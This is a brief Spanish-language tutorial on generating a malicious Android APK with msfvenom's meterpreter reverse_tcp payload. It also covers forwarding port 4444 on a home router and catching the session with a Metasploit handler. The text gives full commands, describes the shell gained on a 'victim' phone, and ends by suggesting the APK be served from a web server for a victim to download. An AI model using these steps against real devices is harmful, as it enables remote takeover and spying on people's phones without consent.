# Msfvenom fuera de Red

MSFvenom es una herramienta del framework Metasploit utilizada para generar payloads maliciosos en distintos formatos. Su uso fuera de red (offline) es común en entornos controlados o de laboratorio donde no se cuenta con conexión a internet.

Primero iremos a nuestro kali linux y crearemos una aplicacion maliciosa con msfvenom y pondremos

Nuestra IP publica:

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=< TU IP PUBLICA > LPORT=4444 -o
android.apk
```

Luego iremos a nuestro navegador y escribiremos la direccion de nuestro router, en la mayoria es
192.168.1.1 y para iniciar secion por defecto admin.

Luego buscaremos donde diga reenvio de puetos:


![Informatica](Puertos.jpg)

abriremos el puerto 4444 y pondremos la IP de nuestro Kali Linux.

Ahora abriremos una nueva terminal en Kali Linux y escribiremos msfconsole luego ingresaremos los
siguientes comandos:

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST IP kali linux
set LPORT 4444
exploit
```


![Informatica](Exploit.jpg)

Luego instalaremos la aplicación maliciosa que creamos en nuestro celular víctima y la abriremos. Ahora iremos a nuestro Kali Linux y veremos que tendremos una sesión de meterpreter, ya estamos dentro de nuestro celular víctima. Para ayudarnos ingresaremos help y podemos ver una serie de información de lo que podemos hacer dentro de nuestro celular víctima.


![Informatica](Help.jpg)

**NOTA:** Pueden subir la aplicación maliciosa a un servidor web como apache2, y hacer que la victima descargue la aplicación desde el servidor web.